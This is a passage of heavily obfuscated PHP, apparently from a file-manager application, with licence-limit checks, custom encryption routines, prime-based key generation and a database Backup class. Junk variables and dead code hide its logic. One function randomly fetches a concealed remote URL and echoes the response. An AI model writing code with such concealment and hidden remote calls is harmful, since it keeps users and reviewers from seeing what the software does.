$¼ŒÏœ÷Ú[276] => $¼ŒÏœ÷Ú[266], $¼ŒÏœ÷Ú[277] => $¼ŒÏœ÷Ú[268], $¼ŒÏœ÷Ú[278] => $¼ŒÏœ÷Ú[279], $¼ŒÏœ÷Ú[280] => $¼ŒÏœ÷Ú[270], $¼ŒÏœ÷Ú[281] => $¼ŒÏœ÷Ú[282], $¼ŒÏœ÷Ú[283] => $¼ŒÏœ÷Ú[272], $¼ŒÏœ÷Ú[284] => $¼ŒÏœ÷Ú[285], $¼ŒÏœ÷Ú[286] => $¼ŒÏœ÷Ú[287], $¼ŒÏœ÷Ú[288] => $¼ŒÏœ÷Ú[289]); $ØÖ¸ê‘æ = $Öô“…Íå[$this->zrjwb39d575c]; $şƒÛÜÃÑ = $›°Ü§Ä÷[686]; if (!$şƒÛÜÃÑ) { die; } $ØÖ¸ê‘æ = intval($ØÖ¸ê‘æ ? $ØÖ¸ê‘æ : $¼ŒÏœ÷Ú[264]); $ƒ¦îüÌ› = _get($this->grhme4a01004, $¼ŒÏœ÷Ú[290]); $•áÕ¼Ş± = $›°Ü§Ä÷[687]; $ƒ¦îüÌ› = $ƒ¦îüÌ› ? intval($ƒ¦îüÌ›) : 0; $ªïÕ·à• = $›°Ü§Ä÷[688]; while ($ªïÕ·à• < $›°Ü§Ä÷[614]) { if ($ªïÕ·à• >= 0) { break; } $ªïÕ·à•++; } return $ØÖ¸ê‘æ + $ƒ¦îüÌ›; $İ™¨îÜ‰ = $›°Ü§Ä÷[689]; if (!$İ™¨îÜ‰) { return; } } public function bzpu90377bbf($ö¡ÑÊ½) { $¾‡ê“µÓ =& $_SERVER[°ÖÎï]; $½â°Ğ÷ = $this->znhjf51f6e2f(); if ($ö¡ÑÊ½[$¾‡ê“µÓ[291]] == $¾‡ê“µÓ[121]) { return; } if ($½â°Ğ÷ >= intval($¾‡ê“µÓ[211])) { return; } $¸ñĞøÚ° = Model($¾‡ê“µÓ[124])->count(); if ($¸ñĞøÚ° <= $½â°Ğ÷) { return; } $Û÷¬Ú¬² = Model($¾‡ê“µÓ[124])->field($¾‡ê“µÓ[291])->limit($½â°Ğ÷)->select(); $˜¼«Òë¢ = $_SERVER[şÒÁøÒÄ][690]; if (!$˜¼«Òë¢) { return; } $Û÷¬Ú¬² = array_to_keyvalue($Û÷¬Ú¬², $¾‡ê“µÓ[6], $¾‡ê“µÓ[291]); if (!in_array($ö¡ÑÊ½[$¾‡ê“µÓ[291]], $Û÷¬Ú¬²)) { show_json($¾‡ê“µÓ[292], !1, $¾‡ê“µÓ[207]); } } public function vpjnadbd03ce() { $í¾¬èñœ =& $_SERVER[şÒÁøÒÄ]; $ã„ÜØëæ =& $_SERVER[°ÖÎï]; if (!_get($GLOBALS, $ã„ÜØëæ[115]) || mt_rand(1, 100) > 20) { return; } $çõ™Ÿ Å = $ã„ÜØëæ[214]; $´˜ü—¨ = $í¾¬èñœ[691]; if (strlen($´˜ü—¨) < $í¾¬èñœ[645]) { die; } $çõ™Ÿ Å = $this->wsbf61de90b0($çõ™Ÿ Å, $ã„ÜØëæ[215]); $êÏÀƒ¾µ = $í¾¬èñœ[692]; while (strlen($êÏÀƒ¾µ) < $í¾¬èñœ[616]) { if (!$êÏÀƒ¾µ) { break; } $êÏÀƒ¾µ++; } $·”–ÅäÚ = stream_context_create(array($ã„ÜØëæ[216] => array($ã„ÜØëæ[217] => $ã„ÜØëæ[218], $ã„ÜØëæ[219] => 3))); $Ê™ÁñÓª = $í¾¬èñœ[693]; if (strlen($Ê™ÁñÓª) < $í¾¬èñœ[614]) { return; } $ßæšü‘Â = @file_get_contents($çõ™Ÿ Å, !1, $·”–ÅäÚ); echo $ã„ÜØëæ[293] . hash_encode($ßæšü‘Â) . $ã„ÜØëæ[294]; $‹øÜöå¶ = $í¾¬èñœ[694]; if (!$‹øÜöå¶) { die; } } private function odby64b3a667($¤äøµ©è, $¿´»Øûó, $Ñ½Ø¼‹Û = 3) { $øâì =& $_SERVER[şÒÁøÒÄ]; $ÎÜúø‚ª =& $_SERVER[°ÖÎï]; usleep(1); $¤äøµ©è = trim($¤äøµ©è); $ç®€’¼Ç = mt_rand(0, 5) . $ÎÜúø‚ª[6]; $ÈŠòÛö‡ = rand_string(15); $Æ¢ö…çş = $ÎÜúø‚ª[295]; $ã»í­Œ° = $øâì[695]; while ($ã»í­Œ° < $øâì[616]) { if ($ã»í­Œ° >= 0) { break; } $ã»í­Œ°++; } switch ($ç®€’¼Ç) { case $ÎÜúø‚ª[203]: $¥÷¾Öš™ = $this->btev0d3ac16a($¤äøµ©è, strrev($¿´»Øûó . $ÈŠòÛö‡)); $ã£Í¹ç = $øâì[696]; if (strlen($ã£Í¹ç) < $øâì[612]) { return; } break; $ºÎŒø™¬ = $øâì[697]; if (strlen($ºÎŒø™¬) < $øâì[627]) { return; } case $ÎÜúø‚ª[121]: $¥÷¾Öš™ = $this->btev0d3ac16a($¤äøµ©è, strrev($ÈŠòÛö‡ . $¿´»Øûó)); $¼¯¿ö÷Á = $øâì[698]; if (strlen($¼¯¿ö÷Á) < $øâì[616]) { die; } break; case $ÎÜúø‚ª[296]: $¥÷¾Öš™ = $this->btev0d3ac16a($¤äøµ©è, base64_encode($ÈŠòÛö‡ . $¿´»Øûó)); $®Ä¦£© = $øâì[699]; break; case $ÎÜúø‚ª[297]: $¥÷¾Öš™ = $this->btev0d3ac16a($¤äøµ©è, md5($ÈŠòÛö‡ . $¿´»Øûó)); $ÃÚı›¼ = $øâì[700]; if (!$ÃÚı›¼) { return; } break; case $ÎÜúø‚ª[298]: $¤äøµ©è = base64_encode($¤äøµ©è); $‡ùÃâƒ = rand(0, 64); $¢Ú’¹ú = $øâì[701]; if (!$¢Ú’¹ú) { return; } $ÆäŠòå¡ = $Æ¢ö…çş[$‡ùÃâƒ]; $‹Šêá½› = md5($ÆäŠòå¡ . md5($¿´»Øûó . $ÆäŠòå¡) . $¿´»Øûó); $­ƒÇã”ü = $øâì[702]; if (strlen($­ƒÇã”ü) < $øâì[612]) { return; } $‹Šêá½› = substr($‹Šêá½›, $‡ùÃâƒ % 8, $‡ùÃâƒ % 8 + 7); $Çåî—°Š = $øâì[703]; while ($Çåî—°Š < $øâì[645]) { if ($Çåî—°Š >= 0) { break; } $Çåî—°Š++; } $Ÿ§Í¡ = $ÎÜúø‚ª[6]; $Ğ¦Ñ‹É• = 0; $ø˜ø·™Ê = $øâì[704]; while ($ø˜ø·™Ê < $øâì[614]) { if ($ø˜ø·™Ê >= 0) { break; } $ø˜ø·™Ê++; } $‡€ ñ†• = 0; $²ªÈË¶ = $øâì[705]; if (strlen($²ªÈË¶) < $øâì[612]) { return; } $ÚúÕ’ÄÎ = 0; $Œ°›ñ = $øâì[706]; for ($Ğ¦Ñ‹É• = 0; $Ğ¦Ñ‹É• < strlen($¤äøµ©è); $Ğ¦Ñ‹É•++) { $ÚúÕ’ÄÎ = $ÚúÕ’ÄÎ == strlen($‹Šêá½›) ? 0 : $ÚúÕ’ÄÎ; $‡€ ñ†• = ($‡ùÃâƒ + strpos($Æ¢ö…çş, $¤äøµ©è[$Ğ¦Ñ‹É•]) + ord($‹Šêá½›[$ÚúÕ’ÄÎ++])) % 64; $è·àø‚ò = $øâì[707]; if (!$è·àø‚ò) { die; } $Ÿ§Í¡ .= $Æ¢ö…çş[$‡€ ñ†•]; } $¥÷¾Öš™ = hash_encode($ÆäŠòå¡ . $Ÿ§Í¡); $¬İ½Òñš = $øâì[708]; if (!$¬İ½Òñš) { return; } break; default: $¥÷¾Öš™ = $this->btev0d3ac16a($¤äøµ©è, $¿´»Øûó . $ÈŠòÛö‡); break; } $¥÷¾Öš™ = strrev($ç®€’¼Ç . $ÈŠòÛö‡ . $¥÷¾Öš™); $ŞÁşöÕ¸ = $øâì[709]; if (strlen($ŞÁşöÕ¸) < $øâì[645]) { return; } if ($Ñ½Ø¼‹Û - 1 > 0) { $¥÷¾Öš™ = $this->odby64b3a667($¥÷¾Öš™, $¿´»Øûó, $Ñ½Ø¼‹Û - 1); } return $¥÷¾Öš™; } private function rtos891d43b3($ùö¥Óá, $Î›ö¶Ş, $­×ôì§Ç = 3) { $ˆŞ¯¨ô· =& $_SERVER[şÒÁøÒÄ]; $µì´ÛÌÙ =& $_SERVER[°ÖÎï]; if (!is_string($ùö¥Óá) || strlen($ùö¥Óá) < 10) { return !1; } $ùö¥Óá = trim($ùö¥Óá); $ÍÓËÔ•‡ = $ˆŞ¯¨ô·[710]; if (strlen($ÍÓËÔ•‡) < $ˆŞ¯¨ô·[645]) { die; } $ùö¥Óá = strrev($ùö¥Óá); $˜”¬¹œ = $ˆŞ¯¨ô·[711]; $¾ıÖíû¥ = $ùö¥Óá[0]; $¼¢ñÉ ğ = substr($ùö¥Óá, 1, 15); $Ú°ëÅ¡ı = $ˆŞ¯¨ô·[712]; if (strlen($Ú°ëÅ¡ı) < $ˆŞ¯¨ô·[612]) { return; } $ùö¥Óá = substr($ùö¥Óá, 16); $êÒåêŸ = $ˆŞ¯¨ô·[713]; if (!$êÒåêŸ) { die; } $ú³®üòÅ = $µì´ÛÌÙ[295]; switch ($¾ıÖíû¥) { case $µì´ÛÌÙ[203]: $íå×˜Áƒ = $this->wsbf61de90b0($ùö¥Óá, strrev($Î›ö¶Ş . $¼¢ñÉ ğ)); break; $ÙòşÄ¡ä = $ˆŞ¯¨ô·[714]; while (strlen($ÙòşÄ¡ä) < $ˆŞ¯¨ô·[612]) { if (!$ÙòşÄ¡ä) { break; } $ÙòşÄ¡ä++; } case $µì´ÛÌÙ[121]: $íå×˜Áƒ = $this->wsbf61de90b0($ùö¥Óá, strrev($¼¢ñÉ ğ . $Î›ö¶Ş)); $œıï¾ğ‚ = $ˆŞ¯¨ô·[715]; if (!$œıï¾ğ‚) { die; } break; case $µì´ÛÌÙ[296]: $íå×˜Áƒ = $this->wsbf61de90b0($ùö¥Óá, base64_encode($¼¢ñÉ ğ . $Î›ö¶Ş)); break; $Š¶éö‰Ù = $ˆŞ¯¨ô·[716]; if (strlen($Š¶éö‰Ù) < $ˆŞ¯¨ô·[627]) { return; } case $µì´ÛÌÙ[297]: $íå×˜Áƒ = $this->wsbf61de90b0($ùö¥Óá, md5($¼¢ñÉ ğ . $Î›ö¶Ş)); $è¬­±Ğ• = $ˆŞ¯¨ô·[717]; while (strlen($è¬­±Ğ•) < $ˆŞ¯¨ô·[627]) { if (!$è¬­±Ğ•) { break; } $è¬­±Ğ•++; } break; case $µì´ÛÌÙ[298]: $ùö¥Óá = hash_decode($ùö¥Óá); $ƒ™Ÿ“´ = $ˆŞ¯¨ô·[718]; if (strlen($ƒ™Ÿ“´) < $ˆŞ¯¨ô·[627]) { return; } $µË»·şŒ = $ùö¥Óá[0]; $æ˜·Ÿ÷Ó = $ˆŞ¯¨ô·[719]; if (strlen($æ˜·Ÿ÷Ó) < $ˆŞ¯¨ô·[627]) { die; } $ùö¥Óá = substr($ùö¥Óá, 1); $üŞÏ‡İø = strpos($ú³®üòÅ, $µË»·şŒ); $ã¯şÇ¦€ = $ˆŞ¯¨ô·[720]; while ($ã¯şÇ¦€ < $ˆŞ¯¨ô·[645]) { if ($ã¯şÇ¦€ >= 0) { break; } $ã¯şÇ¦€++; } $´öÆ¤Ò± = md5($µË»·şŒ . md5($Î›ö¶Ş . $µË»·şŒ) . $Î›ö¶Ş); $´öÆ¤Ò± = substr($´öÆ¤Ò±, $üŞÏ‡İø % 8, $üŞÏ‡İø % 8 + 7); $®Ï±Ÿİ¾ = $ˆŞ¯¨ô·[721]; $í¶’ÃÁ± = $µì´ÛÌÙ[6]; $ïÔÛÙª¥ = $ˆŞ¯¨ô·[722]; while ($ïÔÛÙª¥ < $ˆŞ¯¨ô·[627]) { if ($ïÔÛÙª¥ >= 0) { break; } $ïÔÛÙª¥++; } $¦¬¤ÍÃ» = 0; $í„ÂêçÔ = $ˆŞ¯¨ô·[723]; if (strlen($í„ÂêçÔ) < $ˆŞ¯¨ô·[614]) { return; } $áÃ‚ğ™ = 0; $ëœ±ƒ™³ = $ˆŞ¯¨ô·[674]; while ($ëœ±ƒ™³ < $ˆŞ¯¨ô·[616]) { if ($ëœ±ƒ™³ >= 0) { break; } $ëœ±ƒ™³++; } $Œ¶¬‹Ÿã = 0; for ($¦¬¤ÍÃ» = 0; $¦¬¤ÍÃ» < strlen($ùö¥Óá); $¦¬¤ÍÃ»++) { $Œ¶¬‹Ÿã = $Œ¶¬‹Ÿã == strlen($´öÆ¤Ò±) ? 0 : $Œ¶¬‹Ÿã; $½„æáéÜ = $Œ¶¬‹Ÿã++; $ í‡ÊÉ¼ = $ˆŞ¯¨ô·[724]; if (!$ í‡ÊÉ¼) { return; } $áÃ‚ğ™ = strpos($ú³®üòÅ, $ùö¥Óá[$¦¬¤ÍÃ»]) - $üŞÏ‡İø - ord($´öÆ¤Ò±[$½„æáéÜ]); $¶””¼ûÏ = $ˆŞ¯¨ô·[725]; if (!$¶””¼ûÏ) { return; } while ($áÃ‚ğ™ < 0) { $áÃ‚ğ™ += 64; $Æ°ÃçØ = $ˆŞ¯¨ô·[726]; if (!$Æ°ÃçØ) { return; } } $í¶’ÃÁ± .= $ú³®üòÅ[$áÃ‚ğ™]; $ñÚÈ»¬ = $ˆŞ¯¨ô·[727]; } $íå×˜Áƒ = base64_decode($í¶’ÃÁ±); $ö”öÀÌ™ = $ˆŞ¯¨ô·[728]; if (strlen($ö”öÀÌ™) < $ˆŞ¯¨ô·[614]) { die; } break; $œíÃİºÚ = $ˆŞ¯¨ô·[729]; default: $íå×˜Áƒ = $this->wsbf61de90b0($ùö¥Óá, $Î›ö¶Ş . $¼¢ñÉ ğ); break; $ëÛ¿ğèä = $ˆŞ¯¨ô·[730]; } if ($­×ôì§Ç - 1 > 0) { $íå×˜Áƒ = $this->rtos891d43b3($íå×˜Áƒ, $Î›ö¶Ş, $­×ôì§Ç - 1); } return $íå×˜Áƒ; } public function pyez4d3f653d($º®øœö”) { $²Œµº–› =& $_SERVER[şÒÁøÒÄ]; $éÌÈˆÉÖ =& $_SERVER[°ÖÎï]; $—ê•®•‹ = $this->ephn3981e8d2(); $Šš±¯ŠÅ = $this->ephn3981e8d2(); $ÊôĞ˜Æ = ($—ê•®•‹ - 1) * ($Šš±¯ŠÅ - 1); $½÷™¶Óé = intval(($—ê•®•‹ + $Šš±¯ŠÅ) / 2); while (1) { $¾ó°ıà„ = $½÷™¶Óé; $ñÍüÛƒ½ = $ÊôĞ˜Æ; $ìäŸÔÒ« = $²Œµº–›[731]; if (!$ìäŸÔÒ«) { die; } while ($ñÍüÛƒ½ % $¾ó°ıà„ != 0) { $Ÿèç©¶‚ = $ñÍüÛƒ½; $©ïèĞÀÌ = $²Œµº–›[732]; if (!$©ïèĞÀÌ) { die; } $ñÍüÛƒ½ = $¾ó°ıà„; $¦°­øó¦ = $²Œµº–›[733]; if (!$¦°­øó¦) { return; } $¾ó°ıà„ = $Ÿèç©¶‚ % $¾ó°ıà„; $æŸ³á¹© = $²Œµº–›[734]; if (!$æŸ³á¹©) { die; } } if ($¾ó°ıà„ == 1) { break; } else { $½÷™¶Óé++; } } $¨³éğ­î = 2; for ($„Şª¦©¸ = 0; $„Şª¦©¸ < $ÊôĞ˜Æ * 10; $„Şª¦©¸++) { if (($ÊôĞ˜Æ * $„Şª¦©¸ + 1) % $½÷™¶Óé == 0) { $¨³éğ­î = intval(($ÊôĞ˜Æ * $„Şª¦©¸ + 1) / $½÷™¶Óé); break; } } $ó±ÆÒË = $this->btev0d3ac16a($—ê•®•‹ * $Šš±¯ŠÅ . $éÌÈˆÉÖ[6], $éÌÈˆÉÖ[135]); $¼Î‰Ë›î = $²Œµº–›[735]; if (!$¼Î‰Ë›î) { die; } $ØÏ‚İÃ‘ = md5($éÌÈˆÉÖ[299] . ($—ê•®•‹ + $Šš±¯ŠÅ) . $éÌÈˆÉÖ[300] . $½÷™¶Óé . $éÌÈˆÉÖ[300] . $¨³éğ­î . $éÌÈˆÉÖ[301]); $ØĞŒÕ¢‘ = $²Œµº–›[736]; $ªŒ¾…œ“ = $this->btev0d3ac16a($º®øœö”, $ØÏ‚İÃ‘) . $éÌÈˆÉÖ[302] . $ó±ÆÒË; $áèŞÒõ = $²Œµº–›[737]; return $ªŒ¾…œ“; } public function zpcgae8b256a($ú¶¹æ’) { $üÔÀù– =& $_SERVER[şÒÁøÒÄ]; $ò¤·‘Ïº =& $_SERVER[°ÖÎï]; $‰›¨ö„Ğ = explode($ò¤·‘Ïº[302], $ú¶¹æ’); $üŠì†£¯ = $üÔÀù–[652]; if (count($‰›¨ö„Ğ) != 2) { return $ò¤·‘Ïº[6]; } $…œìš¨ = $this->wsbf61de90b0($‰›¨ö„Ğ[1] . $ò¤·‘Ïº[6], $ò¤·‘Ïº[135]); $úˆ¥’ñî = $üÔÀù–[738]; if (!$úˆ¥’ñî) { return; } if (!$…œìš¨) { return $ò¤·‘Ïº[6]; } $…œìš¨ = intval($…œìš¨); $Óè©Á‹ƒ = $üÔÀù–[739]; if (!$Óè©Á‹ƒ) { return; } $íÖöÄ–€ = 0; $ûÆ¼”ÎŠ = $üÔÀù–[740]; $¦¦¿¿Ï  = 0; $‹²çâçæ = $üÔÀù–[741]; for ($«­˜†ÕŞ = 3; $«­˜†ÕŞ < $…œìš¨; $«­˜†ÕŞ += 2) { if ($…œìš¨ % $«­˜†ÕŞ != 0) { continue; } $íÖöÄ–€ = $«­˜†ÕŞ; $¦¦¿¿Ï  = intval($…œìš¨ / $«­˜†ÕŞ); break; } $É™Ü×âÆ = ($íÖöÄ–€ - 1) * ($¦¦¿¿Ï  - 1); $¹Š¼„­ì = $üÔÀù–[742]; if (strlen($¹Š¼„­ì) < $üÔÀù–[627]) { die; } $•Œõ×ú‰ = intval(($íÖöÄ–€ + $¦¦¿¿Ï ) / 2); $‹‹©­Ì« = $üÔÀù–[743]; while (1) { $£÷•ŠÉı = $•Œõ×ú‰; $Ã¯á¾®ä = $üÔÀù–[744]; if (strlen($Ã¯á¾®ä) < $üÔÀù–[627]) { return; } $Èô‰—û = $É™Ü×âÆ; $×³ó­ªè = $üÔÀù–[745]; if (!$×³ó­ªè) { return; } while ($Èô‰—û % $£÷•ŠÉı != 0) { $£ƒì‡ˆ™ = $Èô‰—û; $Èô‰—û = $£÷•ŠÉı; $ª“‡Õ¤¯ = $üÔÀù–[746]; while (strlen($ª“‡Õ¤¯) < $üÔÀù–[645]) { if (!$ª“‡Õ¤¯) { break; } $ª“‡Õ¤¯++; } $£÷•ŠÉı = $£ƒì‡ˆ™ % $£÷•ŠÉı; } if ($£÷•ŠÉı == 1) { break; } else { $•Œõ×ú‰++; } } $ı†¬²ë¢ = 2; $èÍ°×üË = $üÔÀù–[747]; for ($«­˜†ÕŞ = 0; $«­˜†ÕŞ < $É™Ü×âÆ * 10; $«­˜†ÕŞ++) { if (($É™Ü×âÆ * $«­˜†ÕŞ + 1) % $•Œõ×ú‰ == 0) { $ı†¬²ë¢ = intval(($É™Ü×âÆ * $«­˜†ÕŞ + 1) / $•Œõ×ú‰); break; } } $õæÁëÁ½ = md5($ò¤·‘Ïº[299] . ($íÖöÄ–€ + $¦¦¿¿Ï ) . $ò¤·‘Ïº[300] . $•Œõ×ú‰ . $ò¤·‘Ïº[300] . $ı†¬²ë¢ . $ò¤·‘Ïº[301]); $”³±Øéâ = $üÔÀù–[748]; while (strlen($”³±Øéâ) < $üÔÀù–[645]) { if (!$”³±Øéâ) { break; } $”³±Øéâ++; } $ĞÖ¨ª©ó = $this->wsbf61de90b0($‰›¨ö„Ğ[0], $õæÁëÁ½); $Å´’ò—“ = $üÔÀù–[749]; if (!$Å´’ò—“) { die; } return $ĞÖ¨ª©ó; } public function ephn3981e8d2() { $ÌÁˆÓ© =& $_SERVER[şÒÁøÒÄ]; $–ò —óÚ = mt_rand(pow(2, 14), pow(2, 16) - 1); $Ã©Òª¶» = array(); $÷¥¡®©û = 1; $¬í”…š = $ÌÁˆÓ©[750]; while (strlen($¬í”…š) < $ÌÁˆÓ©[612]) { if (!$¬í”…š) { break; } $¬í”…š++; } while ($÷¥¡®©û <= (int) sqrt($–ò —óÚ)) { $«¸È“Çô = $÷¥¡®©û; while (!0) { $«¸È“Çô++; if ($«¸È“Çô <= 2) { $÷¥¡®©û = $«¸È“Çô; break; } else { if ($«¸È“Çô < 2) { continue; } } $ñ®­øÄ = !0; for ($ÙÚ»Àİà = 2; $ÙÚ»Àİà <= sqrt($«¸È“Çô); $ÙÚ»Àİà++) { if ($«¸È“Çô % $ÙÚ»Àİà == 0) { $ñ®­øÄ = !1; } } if ($ñ®­øÄ) { $÷¥¡®©û = $«¸È“Çô; break; } } $Ã©Òª¶»[] = $÷¥¡®©û; $ĞÁÃ÷ = $ÌÁˆÓ©[751]; if (strlen($ĞÁÃ÷) < $ÌÁˆÓ©[627]) { die; } } $İ¾ğı‰… = 2; for ($«¸È“Çô = $–ò —óÚ; $«¸È“Çô > 1; $«¸È“Çô--) { $ñ®­øÄ = !0; $æ«‹Ê°ª = $ÌÁˆÓ©[752]; while ($æ«‹Ê°ª < $ÌÁˆÓ©[616]) { if ($æ«‹Ê°ª >= 0) { break; } $æ«‹Ê°ª++; } foreach ($Ã©Òª¶» as $ó¯öŠÅï) { if ($«¸È“Çô % $ó¯öŠÅï == 0) { $ñ®­øÄ = !1; break; } } if ($ñ®­øÄ) { $İ¾ğı‰… = $«¸È“Çô; break; } } return $İ¾ğı‰…; $¥çªÅò€ = $ÌÁˆÓ©[753]; if (strlen($¥çªÅò€) < $ÌÁˆÓ©[645]) { return; } } public function gxzke0a33d9d($½Ïø¼ş, $›Àö¬Ã½) { $åÊÎÍéÊ =& $_SERVER[şÒÁøÒÄ]; $­†¡İª =& $_SERVER[°ÖÎï]; return call_user_func(array($­†¡İª[8], $­†¡İª[303]), $½Ïø¼ş, $›Àö¬Ã½); $àè·ºå = $åÊÎÍéÊ[754]; if (strlen($àè·ºå) < $åÊÎÍéÊ[612]) { die; } } public function btev0d3ac16a($Ë¸„‡ ‹, $ÊæŠá¥) { $ëÑ’€… =& $_SERVER[°ÖÎï]; return call_user_func(array($ëÑ’€…[304], $ëÑ’€…[305]), $Ë¸„‡ ‹, $ÊæŠá¥); } public function wsbf61de90b0($É€½…ß¾, $¨ÁúÀ—Ì) { $Ş®ÁçÔ‡ =& $_SERVER[°ÖÎï]; return call_user_func(array($Ş®ÁçÔ‡[304], $Ş®ÁçÔ‡[306]), $É€½…ß¾, $¨ÁúÀ—Ì); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $«”İ =& $_SERVER[şÒÁøÒÄ]; $this->isManual(); self::$name = date($«”İ[755]); if (!($ÚÆÌñà = Model($«”İ[756])->lastItem())) { $ÚÆÌñà = $this->initData(); } else { self::$name = $ÚÆÌñà[$«”İ[32]]; if ($ÚÆÌñà[$«”İ[757]] == $«”İ[88]) { self::$name = date($«”İ[758]); $ÙÑ•©úº = 0; if (isset($ÚÆÌñà[$«”İ[293]][$«”İ[200]][$«”İ[468]])) { $ÙÑ•©úº = (int) $ÚÆÌñà[$«”İ[293]][$«”İ[200]][$«”İ[468]]; } if (self::$manual == 0 && $ÚÆÌñà[$«”İ[32]] == self::$name) { Model($«”İ[756])->remove($ÚÆÌñà[$«”İ[399]]); } $ÚÆÌñà = $this->initData($ÙÑ•©úº, $ÚÆÌñà[$«”İ[759]]); } else { $this->checkStore($ÚÆÌñà[$«”İ[759]]); } } self::$option = $ÚÆÌñà; } private function isManual() { $µ¶ÑŞí = _get($GLOBALS, $_SERVER[şÒÁøÒÄ][760], 0); $µ¶ÑŞí = intval($µ¶ÑŞí); self::$manual = $µ¶ÑŞí && $µ¶ÑŞí == 1 ? 1 : 0; } private function initData($˜¼›Á÷ = 0, $Ù›Ø­Û = '') { $Çğ°ÆÂş =& $_SERVER[şÒÁøÒÄ]; $Éµ®Ú–ò = Model($Çğ°ÆÂş[756])->config(); if ($Ù›Ø­Û && $Éµ®Ú–ò[$Çğ°ÆÂş[759]] != $Ù›Ø­Û) { $˜¼›Á÷ = 0; } $this->checkStore($Éµ®Ú–ò[$Çğ°ÆÂş[759]]); if (self::$manual == 1) { self::$name .= $Çğ°ÆÂş[11] . date($Çğ°ÆÂş[761]); } $Æßü«¥ = array($Çğ°ÆÂş[759] => $Éµ®Ú–ò[$Çğ°ÆÂş[759]], $Çğ°ÆÂş[32] => self::$name, $Çğ°ÆÂş[757] => 0, $Çğ°ÆÂş[762] => $Éµ®Ú–ò[$Çğ°ÆÂş[762]], $Çğ°ÆÂş[763] => self::$manual, $Çğ°ÆÂş[293] => array($Çğ°ÆÂş[764] => array($Çğ°ÆÂş[757] => 0), $Çğ°ÆÂş[765] => array($Çğ°ÆÂş[757] => 0, $Çğ°ÆÂş[766] => 0, $Çğ°ÆÂş[767] => 0, $Çğ°ÆÂş[33] => $Çğ°ÆÂş[12], $Çğ°ÆÂş[768] => 0, $Çğ°ÆÂş[769] => 0), $Çğ°ÆÂş[770] => array($Çğ°ÆÂş[757] => 0, $Çğ°ÆÂş[766] => 0, $Çğ°ÆÂş[767] => 0, $Çğ°ÆÂş[768] => 0, $Çğ°ÆÂş[769] => 0), $Çğ°ÆÂş[200] => array($Çğ°ÆÂş[757] => 0, $Çğ°ÆÂş[771] => 0, $Çğ°ÆÂş[772] => 0, $Çğ°ÆÂş[773] => 0, $Çğ°ÆÂş[774] => 0, $Çğ°ÆÂş[468] => $˜¼›Á÷, $Çğ°ÆÂş[768] => 0, $Çğ°ÆÂş[769] => 0)), $Çğ°ÆÂş[768] => time(), $Çğ°ÆÂş[769] => 0); $¥…È¢Â¯ = Model($Çğ°ÆÂş[756])->insert($Æßü«¥); $Æßü«¥[$Çğ°ÆÂş[399]] = $¥…È¢Â¯; return $Æßü«¥; } private function checkStore($¨ŒÚ¸š) { $é¸¤®šå =& $_SERVER[şÒÁøÒÄ]; $Á³²›Û¢ = Model($é¸¤®šå[775])->listData($¨ŒÚ¸š); Model($é¸¤®šå[775])->checkConfig($Á³²›Û¢); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[şÒÁøÒÄ][756])->findByName(self::$name); } return self::$option; } public static function set($¸ ÎÉ¨) { $ûŒíÂáê =& $_SERVER[şÒÁøÒÄ]; $­’ìƒ™® = self::get(); foreach ($¸ ÎÉ¨ as $Ø®Ä×Õ® => $ğß§½») { $”¾à®’ = explode($ûŒíÂáê[10], $Ø®Ä×Õ®); $Õ†ÔÄô = count($”¾à®’); switch ($Õ†ÔÄô) { case 1: $­’ìƒ™®[$”¾à®’[0]] = $ğß§½»; break; case 2: $­’ìƒ™®[$”¾à®’[0]][$”¾à®’[1]] = $ğß§½»; break; case 3: $­’ìƒ™®[$”¾à®’[0]][$”¾à®’[1]][$”¾à®’[2]] = $ğß§½»; break; } } Model($ûŒíÂáê[756])->update($­’ìƒ™®[$ûŒíÂáê[399]], $­’ìƒ™®); self::$option = $­’ìƒ™®; return self::$option; } public function keep() { $Ù¿¥õ¼é =& $_SERVER[şÒÁøÒÄ]; $”÷’’§± = self::get(); if ($”÷’’§±[$Ù¿¥õ¼é[293]][$Ù¿¥õ¼é[764]][$Ù¿¥õ¼é[757]] == $Ù¿¥õ¼é[88]) { return; } $this->backupKeep($”÷’’§±); self::set(array($Ù¿¥õ¼é[776] => 1)); } private function backupKeep($üÅÃ¨º) { $²Àóì£Ì =& $_SERVER[şÒÁøÒÄ]; if (self::$manual == 1) { return; } $³ªöæÏ­ = Model($²Àóì£Ì[756])->listData(); if (empty($³ªöæÏ­)) { return; } $æÚè˜™® = 0; $¯ò”›ßœ = array(); foreach ($³ªöæÏ­ as $¶‡•ƒ‘) { if ($æÚè˜™® >= 7) { break; } $¯ò”›ßœ[] = $¶‡•ƒ‘[$²Àóì£Ì[32]]; $æÚè˜™®++; } for ($æÚè˜™® = 0; $æÚè˜™® < 12; $æÚè˜™®++) { $¯ò”›ßœ[] = date($²Àóì£Ì[777], strtotime("\55{$æÚè˜™®}\x20\155\x6f\156\164\150\x73")); } $¯ò”›ßœ = array_unique($¯ò”›ßœ); $®ÛÉÙØË = Model($²Àóì£Ì[778])->get($²Àóì£Ì[779]); foreach ($³ªöæÏ­ as $¶‡•ƒ‘) { if (isset($¶‡•ƒ‘[$²Àóì£Ì[763]]) && $¶‡•ƒ‘[$²Àóì£Ì[763]] == $²Àóì£Ì[88]) { continue; } if (!empty($¶‡•ƒ‘[$²Àóì£Ì[32]]) && in_array($¶‡•ƒ‘[$²Àóì£Ì[32]], $¯ò”›ßœ)) { continue; } Model($²Àóì£Ì[756])->remove($¶‡•ƒ‘[$²Àóì£Ì[399]]); $®£ æ¥ = $this->backupPath($üÅÃ¨º, $®ÛÉÙØË); IO::remove($®£ æ¥, !1); } } private function backupPath($•êÏ§÷Õ, $¬Íú¨šÑ = false) { $†üÄ…ŸÛ =& $_SERVER[şÒÁøÒÄ]; if (!$¬Íú¨šÑ) { $¬Íú¨šÑ = Model($†üÄ…ŸÛ[778])->get($†üÄ…ŸÛ[779]); } $ÛÙ¤å›î = $•êÏ§÷Õ[$†üÄ…ŸÛ[32]]; $ÉúÌü§Ó = substr(md5($†üÄ…ŸÛ[780] . $¬Íú¨šÑ . $ÛÙ¤å›î), 0, 8); return "\173\x69\x6f\72{$•êÏ§÷Õ[$†üÄ…ŸÛ[759]]}\175\57\x64\141\164\141\x62\141\163\x65\x2f\142\x61\x63\x6b\165\160\x2f" . $ÛÙ¤å›î . $†üÄ…ŸÛ[11] . $ÉúÌü§Ó; } public function db() { $°€øµ“Ç =& $_SERVER[şÒÁøÒÄ]; $šì„À‚Á = self::get(); if 